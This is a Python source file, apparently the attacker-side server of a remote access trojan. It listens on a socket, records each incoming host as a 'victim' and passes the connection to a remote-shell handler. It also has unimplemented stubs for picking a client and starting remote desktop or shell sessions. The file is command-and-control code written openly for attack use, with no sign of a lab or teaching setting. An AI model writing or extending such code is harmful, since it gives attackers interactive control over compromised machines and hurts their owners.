import socket

import threading
import tkinter as tk

from src.modlues.protocols.victim_dataclass import VictimData
from src.modlues.remote_shell.attacker_rsh import RemoteShellAttackerSide


class Attacker:

    def __init__(self, ip, port):
        self.IP = ip
        self.PORT = port
        self.ADDR = (ip, port)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(self.ADDR)

        self.connected_clients = list()

    def main(self):
        self.__start_listing()

    def __start_listing(self):
        self.server.listen()
        print(f'LISTENING... ({self.IP}:{self.PORT})')
        try:
            while True:
                conn, addr = self.server.accept()
                print(f'connection from: {addr}')

                threading.Thread(target=self.__on_new_client, args=(conn, addr)).start()

        except Exception as e:
            print(e)
            self.server.close()

    def __on_new_client(self, conn, addr):
        self.connected_clients.append(VictimData(conn, addr))
        RemoteShellAttackerSide(conn).main()

    def __admin_input(self):
        pass

    def __choose_client(self, args: list):
        pass

    def __start_remote_desktop(self):
        pass

    def __start_remote_shell(self):
        pass
